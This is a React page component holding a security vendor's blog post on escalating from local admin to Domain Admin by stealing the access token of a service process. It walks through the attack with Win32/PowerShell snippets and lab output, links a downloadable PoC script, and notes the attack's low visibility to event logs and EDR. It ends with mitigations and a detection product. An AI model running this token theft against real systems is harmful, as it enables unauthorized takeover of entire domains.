import { Link } from "react-router-dom";
import { Layout } from "@/components/layout/Layout";
import { ArrowLeft } from "lucide-react";

export default function DomainAdminTokenTheft() {
  return (
    <Layout>
      <article className="pt-32 pb-24 px-6 lg:px-8">
        <div className="container mx-auto max-w-3xl">
          <Link
            to="/blog"
            className="inline-flex items-center gap-2 text-sm text-muted-foreground hover:text-primary transition-colors mb-8"
          >
            <ArrowLeft className="w-4 h-4" />
            Back to Blog
          </Link>

          <p className="font-mono text-xs text-muted-foreground uppercase tracking-widest mb-6">
            Simpity Research &middot; May 12, 2026
          </p>

          <h1 className="text-3xl md:text-4xl lg:text-[2.4rem] font-bold text-foreground leading-tight mb-8">
            Why Running Services Under Domain Admin Accounts Is a{" "}
            <span className="text-primary">Ticking Time Bomb</span>
          </h1>

          <p className="text-lg text-muted-foreground italic mb-12 pb-12 border-b border-border">
            A practical demonstration of token theft &mdash; from local admin to Domain Admin in under ten seconds, using only built-in Windows APIs.
          </p>

          <div className="space-y-5 text-foreground leading-relaxed">
            <p>
              It is one of the most common misconfigurations in enterprise Active Directory environments: a Windows service running under an account that holds Domain Admin privileges. Sometimes it is a monitoring agent, sometimes a backup tool, sometimes a legacy line-of-business application whose vendor documentation casually says "grant the service account Domain Admin rights."
            </p>
            <p>
              Administrators often accept this as a necessary trade-off. The service works, nobody complains, and the risk feels abstract. But the risk is not abstract at all. Any user who holds local administrator rights on the machine where that service runs can escalate to full Domain Admin in under ten seconds, using nothing more than built-in Windows APIs and a short PowerShell script.
            </p>

            <div className="bg-card border-l-4 border-primary rounded-r-lg p-5 my-7">
              <p className="mb-0">
                <strong className="text-primary">MITRE ATT&amp;CK:</strong> T1134.001 &mdash; Access Token Manipulation: Token Impersonation/Theft
              </p>
            </div>

            <h2 className="text-2xl font-semibold text-foreground mt-14 mb-5">
              The problem: overprivileged service accounts
            </h2>

            <p>
              When a Windows service is configured to "Log on as" a domain account, Windows creates a logon session for that account and starts the service process under the resulting security token. That token carries every group membership and privilege of the account &mdash; including Domain Admins if the account is a member.
            </p>
            <p>
              The key insight is that the token lives inside a process on the local machine. And on Windows, a local administrator has the right to open any process running on that machine, read its token, duplicate it, and use it to launch new processes. This is by design &mdash; local admins own the machine.
            </p>
            <p>The combination of these two facts creates a direct privilege escalation path:</p>

            <div className="overflow-x-auto my-6">
              <table className="w-full border border-border text-sm">
                <thead className="bg-secondary">
                  <tr>
                    <th className="text-left px-4 py-2 border-b border-border font-semibold">Step</th>
                    <th className="text-left px-4 py-2 border-b border-border font-semibold">What happens</th>
                  </tr>
                </thead>
                <tbody>
                  <tr className="border-b border-border">
                    <td className="px-4 py-3 font-mono text-primary align-top">Precondition</td>
                    <td className="px-4 py-3">A service on Server-X runs as <code className="bg-secondary px-1.5 py-0.5 rounded font-mono text-xs border border-border">DOMAIN\SvcAdmin</code> (a Domain Admin).</td>
                  </tr>
                  <tr className="border-b border-border">
                    <td className="px-4 py-3 font-mono text-primary align-top">Attacker access</td>
                    <td className="px-4 py-3">Attacker has local admin on Server-X &mdash; but is <strong>not</strong> a Domain Admin.</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-3 font-mono text-primary align-top">Escalation</td>
                    <td className="px-4 py-3">Attacker opens the service process, duplicates its token, and launches a new shell. That shell runs with full Domain Admin privileges.</td>
                  </tr>
                </tbody>
              </table>
            </div>

            <h2 className="text-2xl font-semibold text-foreground mt-14 mb-5">
              The attack: token theft in practice
            </h2>

            <p>
              To make this risk tangible, let us walk through a concrete proof of concept. The entire attack fits in a single PowerShell script and requires no third-party tools &mdash; only Windows APIs available on every Windows system since Vista.
            </p>

            <h3 className="text-xl font-semibold text-foreground mt-10 mb-4">
              Step 1 &mdash; Identify the target process
            </h3>
            <p>
              The attacker lists processes and identifies one running under the privileged domain account. This can be any process &mdash; a service, a scheduled task, an interactive session:
            </p>

            <pre className="bg-secondary border border-border rounded-lg p-4 overflow-x-auto text-xs font-mono leading-relaxed my-4">
{`PS> Get-WmiObject Win32_Process | ForEach-Object {
    $owner = $_.GetOwner()
    [PSCustomObject]@{
        PID  = $_.ProcessId
        Name = $_.Name
        User = "$($owner.Domain)\\$($owner.User)"
    }
} | Where-Object { $_.User -like "*Admin*" }

PID    Name           User
---    ----           ----
84312  MyService.exe  CORP\\SvcDomainAdmin`}
            </pre>

            <h3 className="text-xl font-semibold text-foreground mt-10 mb-4">
              Step 2 &mdash; Open the process and its token
            </h3>
            <p>
              As a local administrator, the attacker calls <code className="bg-secondary px-1.5 py-0.5 rounded font-mono text-sm border border-border">OpenProcess()</code> to get a handle to the target, then <code className="bg-secondary px-1.5 py-0.5 rounded font-mono text-sm border border-border">OpenProcessToken()</code> to access its security token:
            </p>

            <pre className="bg-secondary border border-border rounded-lg p-4 overflow-x-auto text-xs font-mono leading-relaxed my-4">
{`# Open process with PROCESS_QUERY_LIMITED_INFORMATION
$hProcess = OpenProcess(0x1000, $false, 84312)

# Open token with TOKEN_DUPLICATE | TOKEN_QUERY
OpenProcessToken($hProcess, 0x000A, [ref]$hToken)`}
            </pre>

            <p>
              No special tools needed. These are standard Win32 API calls that any local administrator is permitted to make against any local process.
            </p>

            <h3 className="text-xl font-semibold text-foreground mt-10 mb-4">
              Step 3 &mdash; Duplicate the token
            </h3>
            <p>
              The attacker duplicates the token as a Primary token (required for process creation) with SecurityImpersonation level:
            </p>

            <pre className="bg-secondary border border-border rounded-lg p-4 overflow-x-auto text-xs font-mono leading-relaxed my-4">
{`DuplicateTokenEx(
    $hToken,
    MAXIMUM_ALLOWED,
    $null,
    SecurityImpersonation,
    TokenPrimary,
    [ref]$hDupToken)`}
            </pre>

            <h3 className="text-xl font-semibold text-foreground mt-10 mb-4">
              Step 4 &mdash; Launch a shell as Domain Admin
            </h3>
            <p>
              Finally, the attacker calls <code className="bg-secondary px-1.5 py-0.5 rounded font-mono text-sm border border-border">CreateProcessWithTokenW()</code> to start a new PowerShell window using the duplicated Domain Admin token:
            </p>

            <pre className="bg-secondary border border-border rounded-lg p-4 overflow-x-auto text-xs font-mono leading-relaxed my-4">
{`CreateProcessWithTokenW(
    $hDupToken,
    LOGON_WITH_PROFILE,
    "powershell.exe",
    "powershell.exe -NoExit",
    CREATE_NEW_CONSOLE,
    ...)`}
            </pre>

            <p>
              A new PowerShell window opens. Running <code className="bg-secondary px-1.5 py-0.5 rounded font-mono text-sm border border-border">whoami</code> confirms the attacker is now operating as <code className="bg-secondary px-1.5 py-0.5 rounded font-mono text-sm border border-border">CORP\SvcDomainAdmin</code> &mdash; a full Domain Admin. The entire attack takes under 10 seconds and leaves almost no trace in standard Windows event logs.
            </p>

            <div className="bg-card border-l-4 border-primary rounded-r-lg p-5 my-7">
              <p className="mb-0">
                <strong className="text-primary">Key point:</strong> the attacker never needed to know the Domain Admin password. The token was simply "borrowed" from the running process. No brute-force, no credential dumping, no Mimikatz.
              </p>
            </div>

            <h2 className="text-2xl font-semibold text-foreground mt-14 mb-5">
              Live demonstration
            </h2>

            <p>
              We performed a live demonstration in a controlled lab. The setup is intentionally simple &mdash; no exploit kits, no malware, no network pivoting. Just a PowerShell script and a misconfigured service account.
            </p>

            <p>
              Our lab has a member server joined to the <code className="bg-secondary px-1.5 py-0.5 rounded font-mono text-sm border border-border">SIMPITY-EU.LAB</code> domain. On this server, a process (<code className="bg-secondary px-1.5 py-0.5 rounded font-mono text-sm border border-border">notepad.exe</code>) is running under the <code className="bg-secondary px-1.5 py-0.5 rounded font-mono text-sm border border-border">SIMPITY-EU\Administrator</code> account &mdash; a Domain Admin. In a real-world scenario this would be a Windows service such as a backup agent, monitoring tool, or legacy application. The attacker is logged in as a local administrator (<code className="bg-secondary px-1.5 py-0.5 rounded font-mono text-sm border border-border">AB\ABE</code>) with no Domain Admin privileges whatsoever.
            </p>

            <p>The attacker runs a single PowerShell command:</p>

            <pre className="bg-secondary border border-border rounded-lg p-4 overflow-x-auto text-xs font-mono leading-relaxed my-4">
{`Administrator: Windows PowerShell
PS C:\\> .\\Invoke-TokenTheft.ps1 -ProcessName "notepad"

=== Token Theft PoC ===

Target process : notepad (PID 105900)
Running as     : SIMPITY-EU\\Administrator
Attacker       : AB\\ABE

[1] Opening target process...
    Handle obtained: 0xE2C
[2] Opening process token...
    Token handle: 0xE38
[3] Duplicating token (Impersonation -> Primary)...
    Duplicated token: 0xE44
[4] Launching PowerShell with stolen Domain Admin token...

SUCCESS -- PowerShell launched as SIMPITY-EU\\Administrator
New process PID: 52028

MITRE ATT&CK: T1134.001 (Access Token Manipulation: Token Impersonation/Theft)`}
            </pre>

            <p>
              A new PowerShell window appears. Running <code className="bg-secondary px-1.5 py-0.5 rounded font-mono text-sm border border-border">whoami</code> confirms it is running as a Domain Admin:
            </p>

            <pre className="bg-secondary border border-border rounded-lg p-4 overflow-x-auto text-xs font-mono leading-relaxed my-4">
{`Administrator: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe

Token Theft Successful

PS C:\\Windows> whoami
simpity-eu\\administrator
PS C:\\Windows> _`}
            </pre>

            <p>
              The attacker &mdash; who moments ago was just a local administrator with no domain privileges &mdash; now has unrestricted Domain Admin access. The entire attack took less than 10 seconds, used zero third-party tools, and generated no alerts in the Windows Security Event Log.
            </p>

            <a
              href="/downloads/Invoke-TokenTheft.ps1"
              download
              className="inline-block bg-primary/20 text-primary font-mono text-sm px-6 py-3 rounded-md border border-primary/40 hover:bg-primary/30 transition-colors my-4"
            >
              ↓ Download Invoke-TokenTheft.ps1
            </a>

            <h2 className="text-2xl font-semibold text-foreground mt-14 mb-5">
              The blast radius
            </h2>

            <p>Once the attacker has a Domain Admin token, the entire AD domain is compromised. The attacker can:</p>

            <ul className="list-disc pl-6 space-y-2 marker:text-primary">
              <li>Create new Domain Admin accounts for persistence</li>
              <li>Access any file share, mailbox, or database in the domain</li>
              <li>Modify Group Policy to push malware to every workstation</li>
              <li>Perform a DCSync attack to extract all password hashes</li>
              <li>Establish Golden Ticket persistence for indefinite access</li>
              <li>Disable security monitoring and auditing</li>
              <li>Move laterally to any machine in the domain without restriction</li>
            </ul>

            <p>All of this starts from a single misconfiguration: a service account with unnecessary Domain Admin privileges.</p>

            <h2 className="text-2xl font-semibold text-foreground mt-14 mb-5">
              Why standard defenses fall short
            </h2>

            <div className="overflow-x-auto my-6">
              <table className="w-full border border-border text-sm">
                <thead className="bg-secondary">
                  <tr>
                    <th className="text-left px-4 py-2 border-b border-border font-semibold">Defense</th>
                    <th className="text-left px-4 py-2 border-b border-border font-semibold">Why it fails here</th>
                  </tr>
                </thead>
                <tbody>
                  <tr className="border-b border-border">
                    <td className="px-4 py-3 font-mono text-primary align-top whitespace-nowrap">Windows Event Logs</td>
                    <td className="px-4 py-3">Token duplication via <code className="bg-secondary px-1.5 py-0.5 rounded font-mono text-xs border border-border">DuplicateTokenEx</code> generates no security event. <code className="bg-secondary px-1.5 py-0.5 rounded font-mono text-xs border border-border">CreateProcessWithTokenW</code> may log a 4688, but the parent-child relationship looks normal.</td>
                  </tr>
                  <tr className="border-b border-border">
                    <td className="px-4 py-3 font-mono text-primary align-top whitespace-nowrap">Antivirus / EDR</td>
                    <td className="px-4 py-3">The script uses only legitimate Win32 APIs. There is no malware signature to detect. Many EDRs flag Mimikatz but miss raw API token theft.</td>
                  </tr>
                  <tr className="border-b border-border">
                    <td className="px-4 py-3 font-mono text-primary align-top whitespace-nowrap">PAM</td>
                    <td className="px-4 py-3">PAM solutions vault passwords and rotate credentials. This attack does not use passwords &mdash; it steals an already-active token from memory.</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-3 font-mono text-primary align-top whitespace-nowrap">Network segmentation</td>
                    <td className="px-4 py-3">The attack is entirely local to the machine where the service runs. No network traffic is generated during the token theft itself.</td>
                  </tr>
                </tbody>
              </table>
            </div>

            <h2 className="text-2xl font-semibold text-foreground mt-14 mb-5">
              Best practices: reducing the attack surface
            </h2>

            <p>The first line of defense is to eliminate overprivileged service accounts:</p>

            <ul className="list-disc pl-6 space-y-2 marker:text-primary">
              <li><strong className="text-foreground font-semibold">Use Group Managed Service Accounts (gMSA).</strong> They provide automatic password rotation and cannot be used for interactive logon. Grant only the minimum permissions required.</li>
              <li><strong className="text-foreground font-semibold">Apply least privilege.</strong> No service account should be a member of Domain Admins. Delegate only the specific permissions the service needs.</li>
              <li><strong className="text-foreground font-semibold">Audit existing service accounts.</strong> Periodically scan all services across servers using <code className="bg-secondary px-1.5 py-0.5 rounded font-mono text-sm border border-border">Win32_Service</code> queries to identify accounts with excessive privileges.</li>
              <li><strong className="text-foreground font-semibold">Use "Deny log on locally" GPOs.</strong> Restrict where privileged accounts can be used interactively.</li>
              <li><strong className="text-foreground font-semibold">Place privileged accounts in Protected Users.</strong> This prevents NTLM authentication and enforces shorter Kerberos ticket lifetimes.</li>
            </ul>

            <p>
              However, best practices take time to implement. Legacy applications may require elevated permissions. And even with perfect hygiene, a single misconfiguration can reintroduce the risk. This is where real-time monitoring and enforcement become essential.
            </p>

            <h2 className="text-2xl font-semibold text-foreground mt-14 mb-5">
              How Netwrix Threat Prevention detects and blocks this attack
            </h2>

            <p>
              Netwrix Threat Prevention (NTP) operates at the OS kernel and API level on monitored servers, providing real-time visibility into operations that Windows event logs simply do not capture.
            </p>

            <p>
              NTP includes a <strong className="text-foreground font-semibold">Process Guardian</strong> policy that monitors and controls access to protected processes:
            </p>

            <ul className="list-disc pl-6 space-y-2 marker:text-primary">
              <li>NTP monitors all calls to <code className="bg-secondary px-1.5 py-0.5 rounded font-mono text-sm border border-border">OpenProcess()</code> targeting the protected service process.</li>
              <li>If an unauthorized caller attempts to open a handle with <code className="bg-secondary px-1.5 py-0.5 rounded font-mono text-sm border border-border">TOKEN_DUPLICATE</code> or similar access rights, NTP can alert and optionally <strong>block</strong> the call in real time.</li>
              <li>The attack is stopped at Step 2 &mdash; before the token is ever read, duplicated, or used.</li>
              <li>A detailed alert is generated with full context: who attempted the access, from which process, targeting which service, with what access rights.</li>
            </ul>

            <div className="bg-card border-l-4 border-primary rounded-r-lg p-5 my-7">
              <p className="mb-0">
                With Process Guardian enabled, the PowerShell token theft script fails at <code className="bg-secondary px-1.5 py-0.5 rounded font-mono text-sm border border-border">OpenProcessToken()</code> &mdash; the attacker never gets the token handle, and the SOC receives an immediate, actionable alert.
              </p>
            </div>

            <h2 className="text-2xl font-semibold text-foreground mt-14 mb-5">
              Conclusion
            </h2>

            <p>
              Running a Windows service under a Domain Admin account is not just a "bad practice" &mdash; it is a direct, exploitable privilege escalation path that any local administrator can abuse in seconds. The attack uses only built-in Windows APIs, requires no special tools, and is largely invisible to standard security monitoring.
            </p>

            <p>Organizations must take a two-pronged approach:</p>

            <ol className="list-decimal pl-6 space-y-2 marker:text-primary marker:font-mono">
              <li><strong className="text-foreground font-semibold">Reduce the attack surface</strong> by eliminating overprivileged service accounts, adopting gMSAs, and enforcing least privilege.</li>
              <li><strong className="text-foreground font-semibold">Monitor and block in real time</strong> with a solution like Netwrix Threat Prevention that operates at the API level, detecting and stopping token theft before it succeeds.</li>
            </ol>

            <p>
              The question is not whether an attacker will try this technique &mdash; it is whether your organization will detect it when they do.
            </p>

            <div className="border-t border-border my-14" />

            <div className="bg-card border border-border rounded-lg p-6">
              <p className="text-foreground font-semibold text-base mb-1">Alexei Belous</p>
              <p className="text-sm text-muted-foreground leading-relaxed">
                CTO at Simpity. 17+ years in Windows kernel development, LSASS internals, and Active Directory security. Building R&amp;D for security vendors who need deep Windows expertise.
              </p>
            </div>
          </div>
        </div>
      </article>
    </Layout>
  );
}
